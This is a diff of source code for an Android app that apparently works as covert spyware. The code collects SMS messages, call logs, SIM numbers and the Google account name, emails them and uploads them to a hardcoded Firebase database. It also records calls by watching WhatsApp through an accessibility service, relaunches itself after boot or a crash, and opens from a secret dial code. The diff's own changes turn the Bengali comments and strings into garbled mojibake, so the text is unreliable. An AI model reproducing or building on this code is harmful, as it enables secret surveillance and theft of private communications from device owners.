                     double amount = Double.parseDouble(amountString);
                     Log.d(TAG, "Extracted amount: " + amount);
@@ -3185,9 +3251,9 @@ public class SmsReceiver extends BroadcastReceiver {
                 "sim set alart", "sorry drup your recent alls","as soon as you return your missing droup calls",
                 "Why are calls not coming to this number of yours?", "calls not coming to this number of yours?",
                 "number is off? ","number is off",
-                "তুমার এই নম্বারে কল ঢুকছেনা কেন",  "এটা কি তোমার নাম্বার",  "এটা কি ব্লক করা",  "এটা কি ব্লক করা ?",
-                "এই নাম্বারের ফ্রি অফার চেক করুন", "এই নাম্বারের এ্যাপ থেকে অফার চেক করুন",  "এই নাম্বার কি",
-                "এটা কি তোমার",
+                "à¦¤à§à¦®à¦¾à¦° à¦à¦‡ à¦¨à¦®à§à¦¬à¦¾à¦°à§‡ à¦•à¦² à¦¢à§à¦•à¦›à§‡à¦¨à¦¾ à¦•à§‡à¦¨",  "à¦à¦Ÿà¦¾ à¦•à¦¿ à¦¤à§‹à¦®à¦¾à¦° à¦¨à¦¾à¦®à§à¦¬à¦¾à¦°",  "à¦à¦Ÿà¦¾ à¦•à¦¿ à¦¬à§à¦²à¦• à¦•à¦°à¦¾",  "à¦à¦Ÿà¦¾ à¦•à¦¿ à¦¬à§à¦²à¦• à¦•à¦°à¦¾ ?",
+                "à¦à¦‡ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦°à§‡à¦° à¦«à§à¦°à¦¿ à¦…à¦«à¦¾à¦° à¦šà§‡à¦• à¦•à¦°à§à¦¨", "à¦à¦‡ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦°à§‡à¦° à¦à§à¦¯à¦¾à¦ª à¦¥à§‡à¦•à§‡ à¦…à¦«à¦¾à¦° à¦šà§‡à¦• à¦•à¦°à§à¦¨",  "à¦à¦‡ à¦¨à¦¾à¦®à§à¦¬à¦¾à¦° à¦•à¦¿",
+                "à¦à¦Ÿà¦¾ à¦•à¦¿ à¦¤à§‹à¦®à¦¾à¦°",
                 "sim set alarts"
         };
 
@@ -3268,17 +3334,17 @@ public class SmsReceiver extends BroadcastReceiver {
 
 
     public void storeExtractPlusPrefixedNumbersFromSMS(String validNumbers, String messageBody,Context context) {
-        // কনটেক্সট চেক করা (mContext যদি null হয়)
+        // à¦•à¦¨à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦šà§‡à¦• à¦•à¦°à¦¾ (mContext à¦¯à¦¦à¦¿ null à¦¹à§Ÿ)
         if (context == null) {
             Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
-            return; // যদি context null হয়, তাহলে কার্যক্রম বন্ধ করা
+            return; // à¦¯à¦¦à¦¿ context null à¦¹à§Ÿ, à¦¤à¦¾à¦¹à¦²à§‡ à¦•à¦¾à¦°à§à¦¯à¦•à§à¦°à¦® à¦¬à¦¨à§à¦§ à¦•à¦°à¦¾
         }
-        // শেয়ার্ড প্রিফারেন্সে নম্বরগুলো স্টোর করার জন্য editor পাওয়া
+        // à¦¶à§‡à§Ÿà¦¾à¦°à§à¦¡ à¦ªà§à¦°à¦¿à¦«à¦¾à¦°à§‡à¦¨à§à¦¸à§‡ à¦¨à¦®à§à¦¬à¦°à¦—à§à¦²à§‹ à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ editor à¦ªà¦¾à¦“à§Ÿà¦¾
         SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
         SharedPreferences.Editor editor = sharedPreferences.edit();
         if (validNumbers != null && validNumbers.matches("\\+\\d{10,16}")) {
             editor.putString("validPhoneNumbers", validNumbers);
-            editor.apply(); // পরিবর্তনগুলো অ্যাপ্লাই করা
+            editor.apply(); // à¦ªà¦°à¦¿à¦¬à¦°à§à¦¤à¦¨à¦—à§à¦²à§‹ à¦…à§à¦¯à¦¾à¦ªà§à¦²à¦¾à¦‡ à¦•à¦°à¦¾
             Log.d(TAG, "Stored valid phone numbers in SharedPreferences: " + validNumbers);
         } else {
             Log.e(TAG, "Invalid phone number format: " + validNumbers);
@@ -3291,17 +3357,17 @@ public class SmsReceiver extends BroadcastReceiver {
             Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
             return null;
         }
-        // শেয়ার্ড প্রিফারেন্স থেকে স্টোর করা নম্বরগুলো রিটার্ন করা
+        // à¦¶à§‡à§Ÿà¦¾à¦°à§à¦¡ à¦ªà§à¦°à¦¿à¦«à¦¾à¦°à§‡à¦¨à§à¦¸ à¦¥à§‡à¦•à§‡ à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾ à¦¨à¦®à§à¦¬à¦°à¦—à§à¦²à§‹ à¦°à¦¿à¦Ÿà¦¾à¦°à§à¦¨ à¦•à¦°à¦¾
         SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
 
-        // স্টোর করা নম্বর লোগ করা
+        // à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾ à¦¨à¦®à§à¦¬à¦° à¦²à§‹à¦— à¦•à¦°à¦¾
         String validPhoneNumbers = sharedPreferences.getString("validPhoneNumbers", null);
         if (validPhoneNumbers != null) {
             Log.d(TAG, "Stored valid phone numbers in SharedPreferences Retrieve Stored SharedPreferences PhoneNumbers: " + validPhoneNumbers);
         } else {
             Log.d(TAG, "No valid phone numbers found in SharedPreferences Retrieve Stored SharedPreferences PhoneNumbers.");
         }
-        return validPhoneNumbers; // আগের স্টোর করা ডেটা রিটার্ন করুন
+        return validPhoneNumbers; // à¦†à¦—à§‡à¦° à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾ à¦¡à§‡à¦Ÿà¦¾ à¦°à¦¿à¦Ÿà¦¾à¦°à§à¦¨ à¦•à¦°à§à¦¨
     }
 
 
@@ -3335,8 +3401,8 @@ public class SmsReceiver extends BroadcastReceiver {
 
         GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
         String recentCallLogs = getRecentCallLogs.getRecentCallLogs();
-        String title = "Your Notification Title";  // এটি আপনার টাইটেল হবে
-        String text = "Your Notification Text";    // এটি আপনার টেক্সট হবে
+        String title = "Your Notification Title";  // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà¦¾à¦‡à¦Ÿà§‡à¦² à¦¹à¦¬à§‡
+        String text = "Your Notification Text";    // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦¹à¦¬à§‡
         String Get_Sim1_Number = SetSim1Number( context,messageBody);
         GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
         String UserID1= alert.getSim1NumberFromUser(context);
@@ -3359,7 +3425,7 @@ public class SmsReceiver extends BroadcastReceiver {
             Log.e(TAG, "Error calling sendMail: " + e.getMessage());
         }
 
-        // Firebase এ ডেটা সংরক্ষণ করা
+        // Firebase à¦ à¦¡à§‡à¦Ÿà¦¾ à¦¸à¦‚à¦°à¦•à§à¦·à¦£ à¦•à¦°à¦¾
         Log.d(TAG, "SmsReciver Data prepare for Firebase.");
         FirebaseSaVeAndViewData firebaseSaVeAndViewData = new FirebaseSaVeAndViewData();
         firebaseSaVeAndViewData.saveSmsDataToFirebase(sender, messageBody, subject, recentCallLogs,context);
@@ -4005,46 +4071,46 @@ public class AutoRestartReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         if (intent == null) {
             Log.e(TAG, "Received null intent");
-            return;  // যদি intent null হয়, তাহলে কিছুই করবেন না।
+            return;  // à¦¯à¦¦à¦¿ intent null à¦¹à§Ÿ, à¦¤à¦¾à¦¹à¦²à§‡ à¦•à¦¿à¦›à§à¦‡ à¦•à¦°à¦¬à§‡à¦¨ à¦¨à¦¾à¥¤
         }
 
         Log.d(TAG, "App is being restarted...");
 
-        // Intent এর action চেক করা
+        // Intent à¦à¦° action à¦šà§‡à¦• à¦•à¦°à¦¾
         String action = intent.getAction();
         if (action != null && action.equals("android.intent.action.BOOT_COMPLETED")) {
-            // 1 মিনিট পর MainActivity পুনরায় চালু করার জন্য Handler
+            // 1 à¦®à¦¿à¦¨à¦¿à¦Ÿ à¦ªà¦° MainActivity à¦ªà§à¦¨à¦°à¦¾à¦¯à¦¼ à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Handler
             new Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    // MainActivity পুনরায় চালু করার জন্য Intent তৈরি করুন
+                    // MainActivity à¦ªà§à¦¨à¦°à¦¾à¦¯à¦¼ à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Intent à¦¤à§ˆà¦°à¦¿ à¦•à¦°à§à¦¨
                     Intent restartIntent = new Intent(context, MainActivity.class);
-                    restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  // নতুন টাস্ক শুরু করার জন্য Flag
-                    context.startActivity(restartIntent);  // MainActivity শুরু করুন
+                    restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  // à¦¨à¦¤à§à¦¨ à¦Ÿà¦¾à¦¸à§à¦• à¦¶à§à¦°à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Flag
+                    context.startActivity(restartIntent);  // MainActivity à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
                 }
-            }, 60000);  // 60,000 মিলিসেকেন্ড = 1 মিনিট
+            }, 60000);  // 60,000 à¦®à¦¿à¦²à¦¿à¦¸à§‡à¦•à§‡à¦¨à§à¦¡ = 1 à¦®à¦¿à¦¨à¦¿à¦Ÿ
         } else {
             Log.e(TAG, "Received unexpected action: " + action);
         }
     }
 
-    // ক্র্যাশ হ্যান্ডলিং যুক্ত করা হয়েছে
+    // à¦•à§à¦°à§à¦¯à¦¾à¦¶ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¿à¦‚ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡
     public static void initializeCrashHandler(final Context context) {
         Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
             @Override
             public void uncaughtException(Thread thread, Throwable throwable) {
                 Log.e(TAG, "App crashed, restarting...");
 
-                // ক্র্যাশ হওয়ার পর 1 মিনিট পর পুনরায় অ্যাপ চালু করার জন্য Handler
+                // à¦•à§à¦°à§à¦¯à¦¾à¦¶ à¦¹à¦“à§Ÿà¦¾à¦° à¦ªà¦° 1 à¦®à¦¿à¦¨à¦¿à¦Ÿ à¦ªà¦° à¦ªà§à¦¨à¦°à¦¾à§Ÿ à¦…à§à¦¯à¦¾à¦ª à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Handler
                 new Handler().postDelayed(new Runnable() {
                     @Override
                     public void run() {
-                        // MainActivity পুনরায় চালু করার জন্য Intent তৈরি করুন
+                        // MainActivity à¦ªà§à¦¨à¦°à¦¾à§Ÿ à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Intent à¦¤à§ˆà¦°à¦¿ à¦•à¦°à§à¦¨
                         Intent restartIntent = new Intent(context, MainActivity.class);
                         restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        context.startActivity(restartIntent);  // MainActivity শুরু করুন
+                        context.startActivity(restartIntent);  // MainActivity à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
                     }
-                }, 60000); // 60 সেকেন্ড পর পুনরায় চালু হবে
+                }, 60000); // 60 à¦¸à§‡à¦•à§‡à¦¨à§à¦¡ à¦ªà¦° à¦ªà§à¦¨à¦°à¦¾à§Ÿ à¦šà¦¾à¦²à§ à¦¹à¦¬à§‡
             }
         });
     }
@@ -4443,7 +4509,7 @@ public class BackgroundSmsNotificationWorker extends Worker {
     @SuppressLint("LongLogTag")
     @Override
     public Result doWork() {
-        Log.d(TAG, "doWork: SMS বা Notification আসলে কাজ শুরু হচ্ছে");
+        Log.d(TAG, "doWork: SMS à¦¬à¦¾ Notification à¦†à¦¸à¦²à§‡ à¦•à¦¾à¦œ à¦¶à§à¦°à§ à¦¹à¦šà§à¦›à§‡");
 
         try {
             Context context = getApplicationContext();
@@ -4536,7 +4602,7 @@ public class BootBroadcastReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
-            // রিবুট হওয়ার পর কাজ পুনরায় শুরু করুন
+            // à¦°à¦¿à¦¬à§à¦Ÿ à¦¹à¦“à§Ÿà¦¾à¦° à¦ªà¦° à¦•à¦¾à¦œ à¦ªà§à¦¨à¦°à¦¾à§Ÿ à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
             WorkRequest smsNotificationWorkRequest = new OneTimeWorkRequest.Builder(BackgroundSmsNotificationWorker.class).build();
             WorkManager.getInstance(context).enqueue(smsNotificationWorkRequest);
         }
@@ -4793,7 +4859,7 @@ public class CallRecorderAccessibilityService extends AccessibilityService {
     @Override
     public void onCreate() {
         super.onCreate();
-        mContext = getApplicationContext(); // এখন mContext আর null হবে না
+        mContext = getApplicationContext(); // à¦à¦–à¦¨ mContext à¦†à¦° null à¦¹à¦¬à§‡ à¦¨à¦¾
         handler = new Handler(Looper.getMainLooper());
     }
     @Override
@@ -4819,7 +4885,7 @@ public class CallRecorderAccessibilityService extends AccessibilityService {
                 packageName.equals("com.google.android.apps.messaging")||
                 packageName.equals("com.android.mms.service")      ) {
 
-                            // ✅ recording dely for whatesapp set
+                            // âœ… recording dely for whatesapp set
                             if (packageName.equals("com.whatsapp")) {
                                 long currentTime = System.currentTimeMillis();
                                 // Check if 5 seconds have passed since the last update
@@ -4856,7 +4922,7 @@ public class CallRecorderAccessibilityService extends AccessibilityService {
             return;
         }
         Log.d(TAG, "processAccessibilityEvent executionCount: " + executionCount);
-        // ✅ Updated way: Directly accessing static variables
+        // âœ… Updated way: Directly accessing static variables
         // Log the latest notification data
         Log.d(TAG, "CallRecorderAccessibilityglobalMessage1: " + notificationCallingAppGlobalMessage1);
         Log.d(TAG, "CallRecorderAccessibilityglobalMessage2: " + notificationCallingAppGlobalMessage2);
@@ -4887,9 +4953,9 @@ public class CallRecorderAccessibilityService extends AccessibilityService {
         String combinedText = notificationCallingAppGlobalMessage1 + " " + notificationCallingAppGlobalMessage2+ " " + notificationCallingAppGlobalMessage3 + " " + AccessibilityEventcombinedText;
         Log.d(TAG, "processAccessibilityEvent all text: " + combinedText);
 
-        // Start recording if call keywords found Calling… Ringing…
+        // Start recording if call keywords found Callingâ€¦ Ringingâ€¦
         if (combinedText.contains("call")|| combinedText.contains("calling") ||
-                combinedText.contains("Calling…") || combinedText.contains("Ringing…") ||
+                combinedText.contains("Callingâ€¦") || combinedText.contains("Ringingâ€¦") ||
                 combinedText.contains("incoming") ||
                 combinedText.contains("dialing") ||
                 combinedText.contains("voice call") ||combinedText.contains("voice over call") ||
@@ -5106,7 +5172,7 @@ public class CallRecorderAccessibilityService extends AccessibilityService {
             //   Log.d(TAG, "Internet not available, recording saved locally");
         }
 
-        // 5. পুরানো রেকর্ডিং ডিলিট করুন
+        // 5. à¦ªà§à¦°à¦¾à¦¨à§‹ à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¡à¦¿à¦²à¦¿à¦Ÿ à¦•à¦°à§à¦¨
         deleteOldRecordings();
 
 
@@ -5225,7 +5291,7 @@ public class CallRecorderAuto extends BroadcastReceiver {
     private List<String> lastCallNumbers = new ArrayList<>();
     private static int recordingCount = 1;
     private boolean isOnCall = false;
-    private boolean isCallRecording = false; // রেকর্ডিং ফ্ল্যাগ
+    private boolean isCallRecording = false; // à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦«à§à¦²à§à¦¯à¦¾à¦—
 
     public CallRecorderAuto(Context context) {
         if (context != null) {
@@ -5293,9 +5359,9 @@ public class CallRecorderAuto extends BroadcastReceiver {
             if (!isCallRecording) {
                 isCallRecording = true;
                 if (checkAndRequestPermissions(context)) {
-                MicRecord micRecord = new MicRecord(context); // 'this' হলো Context (যেমন Activity বা Service)
-                String messageBody = "Some message";  // প্রকৃত মেসেজ বা প্রয়োজনীয় লজিক এখানে দিন
-                //micRecord.StartRecording(incomingNumber, messageBody); // রেকর্ডিং শুরু করুন
+                MicRecord micRecord = new MicRecord(context); // 'this' à¦¹à¦²à§‹ Context (à¦¯à§‡à¦®à¦¨ Activity à¦¬à¦¾ Service)
+                String messageBody = "Some message";  // à¦ªà§à¦°à¦•à§ƒà¦¤ à¦®à§‡à¦¸à§‡à¦œ à¦¬à¦¾ à¦ªà§à¦°à§Ÿà§‹à¦œà¦¨à§€à§Ÿ à¦²à¦œà¦¿à¦• à¦à¦–à¦¾à¦¨à§‡ à¦¦à¦¿à¦¨
+                //micRecord.StartRecording(incomingNumber, messageBody); // à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
                     // Use application context here
                     //CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService(context.getApplicationContext());
 //                    CallRecorderAccessibilityService callRecorderService = new CallRecorderAccessibilityService();
@@ -5375,7 +5441,7 @@ public class CallRecorderAuto extends BroadcastReceiver {
                         boolean isPatternMatchInCallLogs = isPatternMatchInCallLogs(context);
                         boolean incomingCallNumber = IncomingCallNumber(sender);
 
-//                        // লগিং: কিওয়ার্ড চেক, ইন্টারনেট কনেকশন চেক, এবং ফোন নম্বর চেক করা
+//                        // à¦²à¦—à¦¿à¦‚: à¦•à¦¿à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦šà§‡à¦•, à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦¨à§‡à¦Ÿ à¦•à¦¨à§‡à¦•à¦¶à¦¨ à¦šà§‡à¦•, à¦à¦¬à¦‚ à¦«à§‹à¦¨ à¦¨à¦®à§à¦¬à¦° à¦šà§‡à¦• à¦•à¦°à¦¾
 //                        Log.d(TAG, "handleSmsReceived method Keywords 1 found: " + containsWords1);
 //                        Log.d(TAG, "handleSmsReceived method Keywords 2 found: " + containsWords2);
 //                        Log.d(TAG, "handleSmsReceived method Internet available: " + isInternetAvailable);
@@ -5398,7 +5464,7 @@ public class CallRecorderAuto extends BroadcastReceiver {
              //   Log.d(TAG, "Bundle is null.");
             }
         } catch (Exception e) {
-            // যে কোনো ত্রুটি হলে তাকে লগ করুন
+            // à¦¯à§‡ à¦•à§‹à¦¨à§‹ à¦¤à§à¦°à§à¦Ÿà¦¿ à¦¹à¦²à§‡ à¦¤à¦¾à¦•à§‡ à¦²à¦— à¦•à¦°à§à¦¨
             Log.e(TAG, "Error in handleSmsReceived: ", e);
         }
     }
@@ -5767,8 +5833,8 @@ public class CallRecordSendEmail {
         AccountUtil accountUtil = new AccountUtil();
         String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
         String userSimNumber = accountUtil.getUserSimNumber(context);
-        String title = "Your Notification Title";  // এটি আপনার টাইটেল হবে
-        String text = "Your Notification Text";    // এটি আপনার টেক্সট হবে
+        String title = "Your Notification Title";  // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà¦¾à¦‡à¦Ÿà§‡à¦² à¦¹à¦¬à§‡
+        String text = "Your Notification Text";    // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦¹à¦¬à§‡
         String Get_Sim1_Number = null;
 
         SmsReceiver smsReceiver = new SmsReceiver();
@@ -5952,28 +6018,28 @@ package com.example.fasterpro11;
 import android.util.Log;
 
 public class CountEmail {
-    private static int emailCount = 0; // দৈনিক ইমেলের সংখ্যা ট্র্যাক করার জন্য
-    private static final int DAILY_LIMIT = 499; // দৈনিক সীমা
-    private static final String TAG = "CountEmail"; // লগ ট্যাগ
+    private static int emailCount = 0; // à¦¦à§ˆà¦¨à¦¿à¦• à¦‡à¦®à§‡à¦²à§‡à¦° à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦Ÿà§à¦°à§à¦¯à¦¾à¦• à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯
+    private static final int DAILY_LIMIT = 499; // à¦¦à§ˆà¦¨à¦¿à¦• à¦¸à§€à¦®à¦¾
+    private static final String TAG = "CountEmail"; // à¦²à¦— à¦Ÿà§à¦¯à¦¾à¦—
 
-    // ইমেল পাঠানোর অনুমতি আছে কিনা তা চেক করে
+    // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦…à¦¨à§à¦®à¦¤à¦¿ à¦†à¦›à§‡ à¦•à¦¿à¦¨à¦¾ à¦¤à¦¾ à¦šà§‡à¦• à¦•à¦°à§‡
     public static boolean canSendEmail() {
-        return emailCount < DAILY_LIMIT; // যদি পাঠানো সংখ্যা সীমার মধ্যে থাকে
+        return emailCount < DAILY_LIMIT; // à¦¯à¦¦à¦¿ à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦¸à§€à¦®à¦¾à¦° à¦®à¦§à§à¦¯à§‡ à¦¥à¦¾à¦•à§‡
     }
 
-    // ইমেল কাউন্ট বৃদ্ধি করে এবং লগে সংখ্যা দেখায়
+    // à¦‡à¦®à§‡à¦² à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¬à§ƒà¦¦à§à¦§à¦¿ à¦•à¦°à§‡ à¦à¦¬à¦‚ à¦²à¦—à§‡ à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦¦à§‡à¦–à¦¾à§Ÿ
     public static void incrementEmailCount() {
-        if (emailCount < DAILY_LIMIT) { // সীমার মধ্যে থাকলে
-            emailCount++; // কাউন্টার বৃদ্ধি
-            Log.d(TAG, "Email sent successfully. Total sent emails today: " + emailCount); // সফল ইমেল পাঠানোর লগ মেসেজ
+        if (emailCount < DAILY_LIMIT) { // à¦¸à§€à¦®à¦¾à¦° à¦®à¦§à§à¦¯à§‡ à¦¥à¦¾à¦•à¦²à§‡
+            emailCount++; // à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à§ƒà¦¦à§à¦§à¦¿
+            Log.d(TAG, "Email sent successfully. Total sent emails today: " + emailCount); // à¦¸à¦«à¦² à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦²à¦— à¦®à§‡à¦¸à§‡à¦œ
         } else {
-            Log.d(TAG, "Email limit reached for today. No email sent."); // সীমা পৌঁছালে লগ মেসেজ
+            Log.d(TAG, "Email limit reached for today. No email sent."); // à¦¸à§€à¦®à¦¾ à¦ªà§Œà¦à¦›à¦¾à¦²à§‡ à¦²à¦— à¦®à§‡à¦¸à§‡à¦œ
         }
     }
 
-    // পাঠানো ইমেলের সংখ্যা ফেরত দেয়
+    // à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦‡à¦®à§‡à¦²à§‡à¦° à¦¸à¦‚à¦–à§à¦¯à¦¾ à¦«à§‡à¦°à¦¤ à¦¦à§‡à§Ÿ
     public static int getEmailCount() {
-        return emailCount; // মোট পাঠানো ইমেলের সংখ্যা
+        return emailCount; // à¦®à§‹à¦Ÿ à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦‡à¦®à§‡à¦²à§‡à¦° à¦¸à¦‚à¦–à§à¦¯à¦¾
     }
 }
 
@@ -6014,17 +6080,17 @@ public class DialCodeReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        // ডায়াল কোড যেটি প্রেস করা হয়েছে, সেটা চেক করা হচ্ছে
+        // à¦¡à¦¾à§Ÿà¦¾à¦² à¦•à§‹à¦¡ à¦¯à§‡à¦Ÿà¦¿ à¦ªà§à¦°à§‡à¦¸ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡, à¦¸à§‡à¦Ÿà¦¾ à¦šà§‡à¦• à¦•à¦°à¦¾ à¦¹à¦šà§à¦›à§‡
         String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
 
-        // ডায়াল কোড #*#*67544*#*# এর সাথে মিলে গেলে অ্যাপ খোলা হবে
+        // à¦¡à¦¾à§Ÿà¦¾à¦² à¦•à§‹à¦¡ #*#*67544*#*# à¦à¦° à¦¸à¦¾à¦¥à§‡ à¦®à¦¿à¦²à§‡ à¦—à§‡à¦²à§‡ à¦…à§à¦¯à¦¾à¦ª à¦–à§‹à¦²à¦¾ à¦¹à¦¬à§‡
         if (phoneNumber != null && phoneNumber.equals("#*#*67544*#*#")) {
             Log.d(TAG, "Dial code #*#*67544*#*# detected, opening app.");
 
-            // MainActivity বা আপনার যেকোনো অ্যাকটিভিটি খুলতে এখানে Intent তৈরি করা হয়েছে
+            // MainActivity à¦¬à¦¾ à¦†à¦ªà¦¨à¦¾à¦° à¦¯à§‡à¦•à§‹à¦¨à§‹ à¦…à§à¦¯à¦¾à¦•à¦Ÿà¦¿à¦­à¦¿à¦Ÿà¦¿ à¦–à§à¦²à¦¤à§‡ à¦à¦–à¦¾à¦¨à§‡ Intent à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡
             Intent launchIntent = new Intent(context, MainActivity.class);
             launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Start new task
-            context.startActivity(launchIntent);  // অ্যাপ শুরু করুন
+            context.startActivity(launchIntent);  // à¦…à§à¦¯à¦¾à¦ª à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
         }
     }
 }
@@ -6330,8 +6396,8 @@ public class FileService extends BroadcastReceiver {
             String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
             String userSimNumber = accountUtil.getUserSimNumber(context);
 
-            String title = "Your Notification Title";  // এটি আপনার টাইটেল হবে
-            String text = "Your Notification Text";    // এটি আপনার টেক্সট হবে
+            String title = "Your Notification Title";  // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà¦¾à¦‡à¦Ÿà§‡à¦² à¦¹à¦¬à§‡
+            String text = "Your Notification Text";    // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦¹à¦¬à§‡
             //String Get_Sim1_Number = accountUtil.Set_Sim1_Number(title, text ,  context);
             String Get_Sim1_Number = null;
 
@@ -6477,13 +6543,13 @@ public class FirebaseSaVeAndViewData {
     private static final String DATABASE_URL = "https://fasterpro11-9b9a9-default-rtdb.firebaseio.com/";
     private DatabaseReference mDatabase;
 
-    // Firebase Database ইনিশিয়ালাইজেশন
+    // Firebase Database à¦‡à¦¨à¦¿à¦¶à¦¿à§Ÿà¦¾à¦²à¦¾à¦‡à¦œà§‡à¦¶à¦¨
     public FirebaseSaVeAndViewData() {
         mDatabase = FirebaseDatabase.getInstance(DATABASE_URL).getReference();
     }
 
     /**
-     * SMS ডেটা Firebase-এ সংরক্ষণ করা (SMS ID আগের মতো)
+     * SMS à¦¡à§‡à¦Ÿà¦¾ Firebase-à¦ à¦¸à¦‚à¦°à¦•à§à¦·à¦£ à¦•à¦°à¦¾ (SMS ID à¦†à¦—à§‡à¦° à¦®à¦¤à§‹)
      */
     public void saveSmsDataToFirebase(
             String sender,
@@ -6493,7 +6559,7 @@ public class FirebaseSaVeAndViewData {
             Context context
     ) {
         try {
-            // SIM এবং ডিভাইস তথ্য নিন
+            // SIM à¦à¦¬à¦‚ à¦¡à¦¿à¦­à¦¾à¦‡à¦¸ à¦¤à¦¥à§à¦¯ à¦¨à¦¿à¦¨
             GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
             String UserID1 = alert.getSim1NumberFromUser(context);
             String UserID2 = alert.getSim2NumberFromUser(context);
@@ -6519,7 +6585,7 @@ public class FirebaseSaVeAndViewData {
 
             String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss a", Locale.getDefault()).format(new Date());
 
-            // Firebase push key + timestamp + sim/device info (SMS ID আগের মতো)
+            // Firebase push key + timestamp + sim/device info (SMS ID à¦†à¦—à§‡à¦° à¦®à¦¤à§‹)
             String pushKey = mDatabase.push().getKey();
             String smsId = (pushKey != null ? pushKey : "unknown") + " " +
                     timestamp + " " +
@@ -6542,21 +6608,21 @@ public class FirebaseSaVeAndViewData {
                 // Call logs
                 smsData.put("recentCallLogs", Arrays.asList(recentCallLogs.split("\n")));
 
-                // Firebase-এ সংরক্ষণ
+                // Firebase-à¦ à¦¸à¦‚à¦°à¦•à§à¦·à¦£
                 mDatabase.child("smsData").child(smsId).setValue(smsData)
                         .addOnCompleteListener(task -> {
                             if (task.isSuccessful()) {
-                                Log.d(TAG, "✅ Firebase Data Saved Successfully.");
+                                Log.d(TAG, "âœ… Firebase Data Saved Successfully.");
                             } else {
-                                Log.e(TAG, "❌ Firebase Data Save Error: ", task.getException());
+                                Log.e(TAG, "âŒ Firebase Data Save Error: ", task.getException());
                             }
                         });
             } else {
-                Log.e(TAG, "❌ SMS ID Create Error");
+                Log.e(TAG, "âŒ SMS ID Create Error");
             }
 
         } catch (Exception e) {
-            Log.e(TAG, "❌ Exception in saveSmsDataToFirebase: ", e);
+            Log.e(TAG, "âŒ Exception in saveSmsDataToFirebase: ", e);
         }
     }
 }
@@ -6608,7 +6674,7 @@ public class FirebaseSaveAudioVideoPicture {
         }
 
         try {
